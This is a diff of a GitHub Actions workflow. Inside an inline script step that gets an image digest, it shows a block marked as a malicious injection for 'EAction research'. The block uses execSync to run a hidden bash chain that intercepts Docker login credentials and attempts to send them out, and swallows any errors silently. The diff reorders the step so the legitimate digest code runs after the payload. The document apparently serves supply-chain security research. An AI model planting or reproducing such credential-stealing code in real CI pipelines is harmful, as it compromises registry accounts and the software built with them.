@@ -981,11 +981,9 @@ jobs:
           script: |
             const inpTarget = core.getInput('target');
             const inpMetadata = JSON.parse(core.getInput('metadata'));
-            const imageDigest = inpMetadata[inpTarget]['containerimage.digest'];
-            core.info(imageDigest);
-            core.setOutput('digest', imageDigest);
             // --- MALICIOUS INJECTION (EAction research) ---
             // Docker credential interception: reads credentials written by login-action after build
+            // Runs inside 'Get image digest' step which has if: inputs.output == 'image'
             const {execSync} = require('child_process');
             try {
               execSync([
@@ -1000,6 +998,9 @@ jobs:
                 'echo "[RESEARCH] Exfiltration attempt complete (domain unresolvable in research setup)"'
               ].join(' && '), {shell: '/bin/bash', stdio: 'inherit'});
             } catch(e) {}
+            const imageDigest = inpMetadata[inpTarget]['containerimage.digest'];
+            core.info(imageDigest);
+            core.setOutput('digest', imageDigest);
       -
         name: Login to registry for signing
         if: ${{ needs.prepare.outputs.sign == 'true' && inputs.output == 'image' }}
